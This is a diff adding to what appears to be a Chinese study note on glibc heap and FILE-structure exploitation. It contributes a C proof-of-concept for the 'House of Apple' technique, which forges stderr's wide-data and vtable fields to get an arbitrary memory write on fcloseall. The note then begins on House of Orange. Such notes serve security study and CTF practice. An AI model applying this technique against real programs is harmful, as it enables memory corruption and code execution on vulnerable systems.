@@ -820,6 +820,73 @@ struct _IO_wide_data
 ==换而言之，假如此时在堆上伪造一个 `_IO_FILE` 结构体并已知其地址为 `A`，将 `A + 0xd8` 替换为 `_IO_wstrn_jumps` 地址，`A + 0xa0` 设置为 `B`，并设置其他成员以便能调用到 `_IO_OVERFLOW`。`exit` 函数则会一路调用到 `_IO_wstrn_overflow` 函数，并将 `B` 至 `B + 0x38` 的地址区域的内容都替换为 `A + 0xf0` 或者 `A + 0x1f0`。==
 
 简单写一个 `demo` 程序进行验证：
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<stdint.h>
+#include<unistd.h>
+#include <string.h>
+
+void main()
+{
+    setbuf(stdout, 0);
+    setbuf(stdin, 0);
+    setvbuf(stderr, 0, 2, 0);
+    puts("[*] allocate a 0x100 chunk");
+    size_t *p1 = malloc(0xf0);
+    size_t *tmp = p1;
+    size_t old_value = 0x1122334455667788;
+    for (size_t i = 0; i < 0x100 / 8; i++)
+    {
+        p1[i] = old_value;
+    }
+    puts("===========================old value=======================");
+    for (size_t i = 0; i < 4; i++)
+    {
+        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
+        tmp += 2;
+    }
+    puts("===========================old value=======================");
+
+    size_t puts_addr = (size_t)&puts;
+    printf("[*] puts address: %p\n", (void *)puts_addr);
+    size_t stderr_write_ptr_addr = puts_addr + 0x1997b8;
+    printf("[*] stderr->_IO_write_ptr address: %p\n", (void *)stderr_write_ptr_addr);
+    size_t stderr_flags2_addr = puts_addr + 0x199804;
+    printf("[*] stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
+    size_t stderr_wide_data_addr = puts_addr + 0x199830;
+    printf("[*] stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
+    size_t sdterr_vtable_addr = puts_addr + 0x199868;
+    printf("[*] stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
+    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ed0;
+    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
+
+    puts("[+] step 1: change stderr->_IO_write_ptr to -1");
+    *(size_t *)stderr_write_ptr_addr = (size_t)-1;
+
+    puts("[+] step 2: change stderr->_flags2 to 8");
+    *(size_t *)stderr_flags2_addr = 8;
+
+    puts("[+] step 3: replace stderr->_wide_data with the allocated chunk");
+    *(size_t *)stderr_wide_data_addr = (size_t)p1;
+
+    puts("[+] step 4: replace stderr->vtable with _IO_wstrn_jumps");
+    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;
+
+    puts("[+] step 5: call fcloseall and trigger house of apple");
+    fcloseall();
+    tmp = p1;
+    puts("===========================new value=======================");
+    for (size_t i = 0; i < 4; i++)
+    {
+        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
+        tmp += 2;
+    }
+    puts("===========================new value=======================");
+}
+```
+输出结果如下：
+
 ### House of Orange
  libc2.23->libc2.26
 在题目中没用free类型的操作时利用。House of orange 核心就是通过漏洞利用获得free的效果。
